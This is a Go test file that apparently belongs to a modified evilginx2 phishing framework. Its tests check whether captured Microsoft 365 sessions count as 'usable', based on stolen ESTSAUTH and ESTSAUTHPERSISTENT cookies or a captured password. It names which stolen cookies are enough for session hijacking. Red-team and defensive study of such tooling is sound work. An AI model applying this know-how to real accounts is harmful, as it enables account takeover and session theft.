package core

import (
	"testing"

	"github.com/kgretzky/evilginx2/database"
)

func usableFixture() *DashboardServer {
	cfg := &Config{
		phishlets: map[string]*Phishlet{
			"o365new": {
				Name: "o365new",
				cookieAuthTokens: map[string][]*CookieAuthToken{
					".login.microsoftonline.com": {tok("ESTSAUTH"), tok("ESTSAUTHPERSISTENT"), {name: "brcap", optional: true}},
				},
			},
		},
	}
	return &DashboardServer{cfg: cfg}
}

// Evidence is the authority: a legacy row that has every declared auth cookie
// but was never promoted past stage 2 must still read usable.
func TestUsableStateIsEvidenceDriven(t *testing.T) {
	ds := usableFixture()
	row := &database.Session{
		Phishlet: "o365new",
		Stage:    database.StageCredentials, // legacy row, stage never advanced
		CookieTokens: map[string]map[string]*database.CookieToken{
			".login.microsoftonline.com": domain("buid", "ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"),
		},
	}
	ok, reason, _ := ds.usableState(row)
	if !ok {
		t.Fatalf("complete cookie evidence must read usable (reason %q)", reason)
	}
	if reason != "all declared auth cookies captured" {
		t.Errorf("unexpected reason: %q", reason)
	}
}

// A session that captured some cookies but not the session cookie is not usable.
func TestUsableStatePartialIsNotUsable(t *testing.T) {
	ds := usableFixture()
	row := &database.Session{
		Phishlet: "o365new",
		Stage:    database.StageAuthenticated, // promoted, but evidence is incomplete
		CookieTokens: map[string]map[string]*database.CookieToken{
			".login.microsoftonline.com": domain("buid", "esctx", "fpc"),
		},
	}
	ok, reason, missing := ds.usableState(row)
	if ok {
		t.Fatalf("partial capture must not be usable (reason %q)", reason)
	}
	if len(missing) == 0 {
		t.Error("a partial must report the missing cookies")
	}
}

// Nothing captured at all must not read usable just because no domain was seen.
func TestUsableStateNoEvidenceIsNotUsable(t *testing.T) {
	ds := usableFixture()
	row := &database.Session{Phishlet: "o365new", Stage: database.StageVisited}
	ok, reason, _ := ds.usableState(row)
	if ok {
		t.Fatalf("a visited session with no cookies must not be usable (reason %q)", reason)
	}
}

// HasAnyCookieAuthToken distinguishes "no evidence" from "complete".
func TestHasAnyCookieAuthToken(t *testing.T) {
	pl := declaredPL(map[string][]*CookieAuthToken{
		".login.microsoftonline.com": {tok("ESTSAUTH")},
	})
	if (&Session{}).HasAnyCookieAuthToken(pl.cookieAuthTokens) {
		t.Error("empty session must report no evidence")
	}
	s := sessWith("", map[string]map[string]*database.CookieToken{
		"login.microsoftonline.com": domain("buid"), // captured, but not a declared token
	})
	if s.HasAnyCookieAuthToken(pl.cookieAuthTokens) {
		t.Error("only undeclared cookies captured: must report no evidence")
	}
	s2 := sessWith("", map[string]map[string]*database.CookieToken{
		".login.microsoftonline.com": domain("ESTSAUTH"),
	})
	if !s2.HasAnyCookieAuthToken(pl.cookieAuthTokens) {
		t.Error("declared token captured must report evidence")
	}
}

// A phishlet that declares no tokens still falls back to password + confirmation.
func TestUsableStateNoDeclaredTokensFallsBackToStage(t *testing.T) {
	ds := usableFixture()
	ds.cfg.phishlets["plain"] = &Phishlet{Name: "plain"}
	row := &database.Session{Phishlet: "plain", Stage: database.StageAuthenticated, Password: "pw"}
	if ok, _, _ := ds.usableState(row); !ok {
		t.Error("no declared tokens + authenticated stage must be usable")
	}
	row2 := &database.Session{Phishlet: "plain", Stage: database.StageCredentials, Password: "pw"}
	if ok, _, _ := ds.usableState(row2); ok {
		t.Error("no declared tokens + password-only stage must not be usable")
	}
}
